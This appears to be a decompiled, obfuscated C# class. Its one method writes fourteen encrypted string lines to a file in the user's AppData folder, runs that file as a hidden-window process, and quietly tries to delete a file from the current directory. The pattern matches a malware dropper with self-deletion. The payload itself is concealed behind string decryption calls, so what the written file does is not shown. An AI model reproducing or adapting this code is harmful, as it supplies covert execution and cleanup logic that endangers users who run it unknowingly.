using System;
using System.Diagnostics;
using System.IO;

namespace ___codefort;

internal sealed class Class7
{
	public static void smethod_0()
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_0(737969059)))
		{
			StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_0(737969059));
			streamWriter.WriteLine(Class22.smethod_0(737969073));
			streamWriter.WriteLine(Class22.smethod_0(737968981));
			streamWriter.WriteLine(Class22.smethod_0(737969005));
			streamWriter.WriteLine(Class22.smethod_0(737968905));
			streamWriter.WriteLine(Class22.smethod_0(737968324));
			streamWriter.WriteLine(Class22.smethod_0(737968382));
			streamWriter.WriteLine(Class22.smethod_0(737968306));
			streamWriter.WriteLine(Class22.smethod_0(737968234));
			streamWriter.WriteLine(Class22.smethod_0(737968162));
			streamWriter.WriteLine(Class22.smethod_0(737968614));
			streamWriter.WriteLine(Class22.smethod_0(737968542));
			streamWriter.WriteLine(Class22.smethod_0(737968479));
			streamWriter.WriteLine(Class22.smethod_0(737968412));
			streamWriter.WriteLine(Class22.smethod_0(737971933));
			streamWriter.Close();
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_0(737969059);
			process.Start();
			try
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), Class22.smethod_0(737971941)));
			}
			catch
			{
			}
		}
	}
}
